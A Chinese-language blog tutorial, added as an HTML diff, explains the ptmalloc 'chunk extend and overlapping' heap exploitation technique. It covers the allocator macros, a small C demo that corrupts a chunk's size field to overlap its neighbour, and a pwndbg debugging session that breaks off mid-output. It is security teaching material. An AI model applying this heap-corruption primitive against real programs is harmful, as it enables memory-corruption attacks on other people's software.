@@ -1,0 +1,1009 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/sakura.png">
+  <link rel="icon" href="/img/sakura.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="花時雨">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Overview chunk extend 是堆漏洞的一种常见利用手法，通过 extend 可以实现 chunk overlapping 的效果。这种利用方法需要以下的时机和条件：   程序中存在基于堆的漏洞 漏洞可以控制 chunk header 中的数据  ptmalloc对堆进行操作时使用的宏chunk extend 技术能够产生的原因在于 ptmalloc 在对堆 chunk 进行操作时使">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Chunk Extend and Overlapping">
+<meta property="og:url" content="https://hanashigure.github.io/2026/02/09/chunk-extend-overlapping/index.html">
+<meta property="og:site_name" content="花時雨的流水账">
+<meta property="og:description" content="Overview chunk extend 是堆漏洞的一种常见利用手法，通过 extend 可以实现 chunk overlapping 的效果。这种利用方法需要以下的时机和条件：   程序中存在基于堆的漏洞 漏洞可以控制 chunk header 中的数据  ptmalloc对堆进行操作时使用的宏chunk extend 技术能够产生的原因在于 ptmalloc 在对堆 chunk 进行操作时使">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://hanashigure.github.io/images/chunk_extend_overlapping/1.png">
+<meta property="og:image" content="https://hanashigure.github.io/images/chunk_extend_overlapping/2.png">
+<meta property="og:image" content="https://hanashigure.github.io/images/chunk_extend_overlapping/3.png">
+<meta property="og:image" content="https://hanashigure.github.io/images/chunk_extend_overlapping/4.png">
+<meta property="og:image" content="https://hanashigure.github.io/images/chunk_extend_overlapping/5.png">
+<meta property="og:image" content="https://hanashigure.github.io/images/chunk_extend_overlapping/6.png">
+<meta property="og:image" content="https://hanashigure.github.io/images/chunk_extend_overlapping/7.png">
+<meta property="og:image" content="https://hanashigure.github.io/images/chunk_extend_overlapping/8.png">
+<meta property="og:image" content="https://hanashigure.github.io/images/chunk_extend_overlapping/9.png">
+<meta property="og:image" content="https://hanashigure.github.io/images/chunk_extend_overlapping/10.png">
+<meta property="article:published_time" content="2026-02-09T13:37:16.000Z">
+<meta property="article:modified_time" content="2026-02-11T04:30:34.394Z">
+<meta property="article:author" content="花時雨">
+<meta property="article:tag" content="堆溢出">
+<meta property="article:tag" content="Heap">
+<meta property="article:tag" content="Chunk Extend and Overlapping">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://hanashigure.github.io/images/chunk_extend_overlapping/1.png">
+  
+  
+  
+  <title>Chunk Extend and Overlapping - 花時雨的流水账</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="https://cdn.staticfile.org/lxgw-wenkai-screen-webfont/1.7.0/style.min.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"hanashigure.github.io","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>花時雨的流水账</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="开灯"
+               data-label-dark="关灯">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">关灯</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/background.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Chunk Extend and Overlapping"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-02-09 21:37" pubdate>
+          2026年2月9日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          20k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          166 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Chunk Extend and Overlapping</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><blockquote>
+<p>chunk extend 是堆漏洞的一种常见利用手法，通过 extend 可以实现 chunk overlapping 的效果。这种利用方法需要以下的时机和条件：</p>
+</blockquote>
+<ul>
+<li>程序中存在基于堆的漏洞</li>
+<li>漏洞可以控制 chunk header 中的数据</li>
+</ul>
+<h2 id="ptmalloc对堆进行操作时使用的宏"><a href="#ptmalloc对堆进行操作时使用的宏" class="headerlink" title="ptmalloc对堆进行操作时使用的宏"></a>ptmalloc对堆进行操作时使用的宏</h2><p>chunk extend 技术能够产生的原因在于 ptmalloc 在对堆 chunk 进行操作时使用的各种宏；  </p>
+<p>在 ptmalloc 中，获取 chunk 块大小的操作如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Get size, ignoring use bits */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span><br><br><span class="hljs-comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunksize_nomask(p) ((p)-&gt;mchunk_size)</span><br></code></pre></td></tr></table></figure>
+
+<p>即使用当前块指针加上当前块大小。  </p>
+<p>在 ptmalloc 中，获取前一个 chunk 信息的操作如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span><br><br><span class="hljs-comment">/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))</span><br></code></pre></td></tr></table></figure>
+
+<p>即通过 malloc_chunk-&gt;prev_size 获取前一块大小，然后使用本 chunk 地址减去所得大小。  </p>
+<p>在 ptmalloc，判断当前 chunk 是否是 use 状态的操作如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> inuse(p)</span><br>    ((((mchunkptr)(((<span class="hljs-type">char</span> *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)<br></code></pre></td></tr></table></figure>
+
+<p>即查看下一 chunk 的 prev_inuse 域，而下一块地址又如我们前面所述是根据当前 chunk 的 size 计算得出的。</p>
+<blockquote>
+<p>具体为什么是这样以及更多操作详见 <a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/heap-structure/">CTF Wiki - 堆相关数据结构</a>。</p>
+</blockquote>
+<p>通过上面几个宏可以看出，ptmalloc 通过 <strong>chunk header 的数据判断 chunk 的使用情况和对 chunk 的前后块进行定位</strong>。简而言之，chunk extend 就是通过控制 size 和 pre_size 域来实现跨越块操作从而导致 overlapping 的。</p>
+<h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><h3 id="基本示例-1：对-inuse-的-fastbin-进行-extend"><a href="#基本示例-1：对-inuse-的-fastbin-进行-extend" class="headerlink" title="基本示例 1：对 inuse 的 fastbin 进行 extend"></a>基本示例 1：对 inuse 的 fastbin 进行 extend</h3><ul>
+<li>利用的效果是通过更改第一个块的大小来控制第二个块的内容。</li>
+<li><strong>示例都是在 64 位的程序。如果想在 32 位下进行测试，可以把 8 字节偏移改为 4 字节</strong>。</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">void</span> *ptr,*ptr1;<br><br>    ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//分配第一个0x10的chunk</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//分配第二个0x10的chunk</span><br><br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span> *)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0x41</span>;<span class="hljs-comment">// 修改第一个块的size域</span><br><br>    <span class="hljs-built_in">free</span>(ptr);<br>    ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>);<span class="hljs-comment">// 实现 extend，控制了第二个块的内容</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>我们进pwndbg中调试一下，观察“当两个 malloc 语句执行之后，堆的内存分布”、“代码中把 chunk1 的 size 域更改为 0x41”、“执行 free 之后，chunk2 与 chunk1 合成一个 0x40 大小的 chunk”和“通过 malloc(0x30) 得到 chunk1+chunk2 的块”；</p>
+<blockquote>
+<p>我分别在 <code>main+22</code> （第一个malloc返回处）、<code>main+36</code>（第二个malloc返回处）、<code>main+51</code>（把 chunk1 的 size 域更改为 0x41后返回处）、<code>main+58</code>（free前）、<code>main+63</code>（free后）和 <code>main+73</code>（通过 malloc(0x30) 得到 chunk1+chunk2 的块前）下断点。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">pwndbg&gt; disassemble main<br>Dump of assembler code <span class="hljs-keyword">for</span> <span class="hljs-keyword">function</span> main:<br>   0x0000000000401156 &lt;+0&gt;:     endbr64<br>   0x000000000040115a &lt;+4&gt;:     push   rbp<br>   0x000000000040115b &lt;+5&gt;:     mov    rbp,rsp<br>   0x000000000040115e &lt;+8&gt;:     sub    rsp,0x10<br>   0x0000000000401162 &lt;+12&gt;:    mov    edi,0x10<br>   0x0000000000401167 &lt;+17&gt;:    call   0x401060 &lt;malloc@plt&gt;<br>   0x000000000040116c &lt;+22&gt;:    mov    QWORD PTR [rbp-0x8],rax<br>   0x0000000000401170 &lt;+26&gt;:    mov    edi,0x10<br>   0x0000000000401175 &lt;+31&gt;:    call   0x401060 &lt;malloc@plt&gt;<br>   0x000000000040117a &lt;+36&gt;:    mov    rax,QWORD PTR [rbp-0x8]<br>   0x000000000040117e &lt;+40&gt;:    sub    rax,0x8<br>   0x0000000000401182 &lt;+44&gt;:    mov    QWORD PTR [rax],0x41<br>   0x0000000000401189 &lt;+51&gt;:    mov    rax,QWORD PTR [rbp-0x8]<br>   0x000000000040118d &lt;+55&gt;:    mov    rdi,rax<br>   0x0000000000401190 &lt;+58&gt;:    call   0x401050 &lt;free@plt&gt;<br>   0x0000000000401195 &lt;+63&gt;:    mov    edi,0x30<br>   0x000000000040119a &lt;+68&gt;:    call   0x401060 &lt;malloc@plt&gt;<br>   0x000000000040119f &lt;+73&gt;:    mov    QWORD PTR [rbp-0x10],rax<br>   0x00000000004011a3 &lt;+77&gt;:    mov    eax,0x0<br>   0x00000000004011a8 &lt;+82&gt;:    leave<br>   0x00000000004011a9 &lt;+83&gt;:    ret<br>End of assembler dump.<br>pwndbg&gt; b *main+22<br>Breakpoint 1 at 0x40116c: file main.c, line 7.<br>pwndbg&gt; b *main+36<br>Breakpoint 2 at 0x40117a: file main.c, line 10.<br>pwndbg&gt; b *main+51<br>Breakpoint 3 at 0x401189: file main.c, line 12.<br>pwndbg&gt; b *main+58<br>Breakpoint 4 at 0x401190: file main.c, line 12.<br>pwndbg&gt; b *main+63<br>Breakpoint 5 at 0x401195: file main.c, line 13.<br>pwndbg&gt; b *main+73<br>Breakpoint 6 at 0x40119f: file main.c, line 13.<br>pwndbg&gt;<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>其实我这里的多下了一个断点，所以我这里c了一次</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs bash">pwndbg&gt; c<br>Continuing.<br><br>Breakpoint 2, main () at main.c:10<br>10          *(long long *)((long long)ptr-<span class="hljs-number">0</span>x8)=<span class="hljs-number">0</span>x41;// 修改第一个块的size域<br>LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA<br>─────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────────────────<br>*RAX  <span class="hljs-number">0</span>x4042c0 ◂— <span class="hljs-number">0</span><br> RBX  <span class="hljs-number">0</span><br> RCX  <span class="hljs-number">0</span>x21<br> RDX  <span class="hljs-number">0</span><br> RDI  <span class="hljs-number">0</span><br>*RSI  <span class="hljs-number">0</span>x4042d0 ◂— <span class="hljs-number">0</span><br> R8   <span class="hljs-number">0</span>x21001<br>*R9   <span class="hljs-number">0</span>x4042c0 ◂— <span class="hljs-number">0</span><br> R10  <span class="hljs-number">0</span>xfffffffffffff000<br> R11  <span class="hljs-number">0</span>x7ffff7e1ace0 (main_arena+<span class="hljs-number">96</span>) —▸ <span class="hljs-number">0</span>x4042d0 ◂— <span class="hljs-number">0</span><br> R12  <span class="hljs-number">0</span>x7fffffffdcf8 —▸ <span class="hljs-number">0</span>x7fffffffdfb5 ◂— <span class="hljs-number">0</span>x657a2f656d6f682f (&#x27;/home/ze&#x27;)<br> R13  <span class="hljs-number">0</span>x401156 (main) ◂— endbr64<br> R14  <span class="hljs-number">0</span>x4030e8 (__do_global_dtors_aux_fini_array_entry) —▸ <span class="hljs-number">0</span>x401120 (__do_global_dtors_aux) ◂— endbr64<br> R15  <span class="hljs-number">0</span>x7ffff7ffd040 (_rtld_global) —▸ <span class="hljs-number">0</span>x7ffff7ffe2e0 ◂— <span class="hljs-number">0</span><br> RBP  <span class="hljs-number">0</span>x7fffffffdbe0 ◂— <span class="hljs-number">1</span><br> RSP  <span class="hljs-number">0</span>x7fffffffdbd0 &#123;ptr1&#125; ◂— <span class="hljs-number">0</span>x1000<br>*RIP  <span class="hljs-number">0</span>x40117a (main+<span class="hljs-number">36</span>) ◂— mov rax, qword ptr [rbp - <span class="hljs-number">8</span>]<br>──────────────────────────────────────────────────────────────────────────────[ DISASM / x86-<span class="hljs-number">64</span> / set emulate on ]───────────────────────────────────────────────────────────────────────────────<br>b+ <span class="hljs-number">0</span>x40116c &lt;main+<span class="hljs-number">22</span>&gt;    mov    qword ptr [rbp - <span class="hljs-number">8</span>], rax     [&#123;ptr&#125;] &lt;= <span class="hljs-number">0</span>x4042a0 ◂— <span class="hljs-number">0</span><br>   <span class="hljs-number">0</span>x401170 &lt;main+<span class="hljs-number">26</span>&gt;    mov    edi, <span class="hljs-number">0</span>x10                    EDI =&gt; <span class="hljs-number">0</span>x10<br>   <span class="hljs-number">0</span>x401175 &lt;main+<span class="hljs-number">31</span>&gt;    call   malloc@plt                  &lt;malloc@plt&gt;<br><br> ► <span class="hljs-number">0</span>x40117a &lt;main+<span class="hljs-number">36</span>&gt;    mov    rax, qword ptr [rbp - <span class="hljs-number">8</span>]     RAX, [&#123;ptr&#125;] =&gt; <span class="hljs-number">0</span>x4042a0 ◂— <span class="hljs-number">0</span><br>   <span class="hljs-number">0</span>x40117e &lt;main+<span class="hljs-number">40</span>&gt;    sub    rax, <span class="hljs-number">8</span>                       RAX =&gt; <span class="hljs-number">0</span>x404298 (<span class="hljs-number">0</span>x4042a0 - <span class="hljs-number">0</span>x8)<br>   <span class="hljs-number">0</span>x401182 &lt;main+<span class="hljs-number">44</span>&gt;    mov    qword ptr [rax], <span class="hljs-number">0</span>x41        [<span class="hljs-number">0</span>x404298] &lt;= <span class="hljs-number">0</span>x41<br>b+ <span class="hljs-number">0</span>x401189 &lt;main+<span class="hljs-number">51</span>&gt;    mov    rax, qword ptr [rbp - <span class="hljs-number">8</span>]     RAX, [&#123;ptr&#125;] =&gt; <span class="hljs-number">0</span>x4042a0 ◂— <span class="hljs-number">0</span><br>   <span class="hljs-number">0</span>x40118d &lt;main+<span class="hljs-number">55</span>&gt;    mov    rdi, rax                     RDI =&gt; <span class="hljs-number">0</span>x4042a0 ◂— <span class="hljs-number">0</span><br>b+ <span class="hljs-number">0</span>x401190 &lt;main+<span class="hljs-number">58</span>&gt;    call   free@plt                    &lt;free@plt&gt;<br><br>b+ <span class="hljs-number">0</span>x401195 &lt;main+<span class="hljs-number">63</span>&gt;    mov    edi, <span class="hljs-number">0</span>x30                    EDI =&gt; <span class="hljs-number">0</span>x30<br>   <span class="hljs-number">0</span>x40119a &lt;main+<span class="hljs-number">68</span>&gt;    call   malloc@plt                  &lt;malloc@plt&gt;<br>────────────────────────────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────────────────────────────────────────────────────────<br>In file: /home/zer0ptr/Pwn-Research/Heap-overflow-basic/Chunk_extend_overlapping/对inuse的fastbin进行extend/main.c:<span class="hljs-number">10</span><br>    <span class="hljs-number">5</span>     void *ptr,*ptr1;<br>    <span class="hljs-number">6</span><br>    <span class="hljs-number">7</span>     ptr=malloc(<span class="hljs-number">0</span>x10);//分配第一个<span class="hljs-number">0</span>x10的chunk<br>    <span class="hljs-number">8</span>     malloc(<span class="hljs-number">0</span>x10);//分配第二个<span class="hljs-number">0</span>x10的chunk<br>    <span class="hljs-number">9</span><br> ► <span class="hljs-number">10</span>     *(long long *)((long long)ptr-<span class="hljs-number">0</span>x8)=<span class="hljs-number">0</span>x41;// 修改第一个块的size域<br>   <span class="hljs-number">11</span><br>   <span class="hljs-number">12</span>     free(ptr);<br>   <span class="hljs-number">13</span>     ptr1=malloc(<span class="hljs-number">0</span>x30);// 实现 extend，控制了第二个块的内容<br>   <span class="hljs-number">14</span>     return <span class="hljs-number">0</span>;<br>   <span class="hljs-number">15</span> &#125;<br>────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────<br><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>│ rsp <span class="hljs-number">0</span>x7fffffffdbd0 &#123;ptr1&#125; ◂— <span class="hljs-number">0</span>x1000<br><span class="hljs-number">01</span>:<span class="hljs-number">0008</span>│-<span class="hljs-number">008</span> <span class="hljs-number">0</span>x7fffffffdbd8 &#123;ptr&#125; —▸ <span class="hljs-number">0</span>x4042a0 ◂— <span class="hljs-number">0</span><br><span class="hljs-number">02</span>:<span class="hljs-number">0010</span>│ rbp <span class="hljs-number">0</span>x7fffffffdbe0 ◂— <span class="hljs-number">1</span><br><span class="hljs-number">03</span>:<span class="hljs-number">0018</span>│+<span class="hljs-number">008</span> <span class="hljs-number">0</span>x7fffffffdbe8 —▸ <span class="hljs-number">0</span>x7ffff7c29d90 (__libc_start_call_main+<span class="hljs-number">128</span>) ◂— mov edi, eax<br><span class="hljs-number">04</span>:<span class="hljs-number">0020</span>│+<span class="hljs-number">010</span> <span class="hljs-number">0</span>x7fffffffdbf0 ◂— <span class="hljs-number">0</span><br><span class="hljs-number">05</span>:<span class="hljs-number">0028</span>│+<span class="hljs-number">018</span> <span class="hljs-number">0</span>x7fffffffdbf8 —▸ <span class="hljs-number">0</span>x401156 (main) ◂— endbr64<br><span 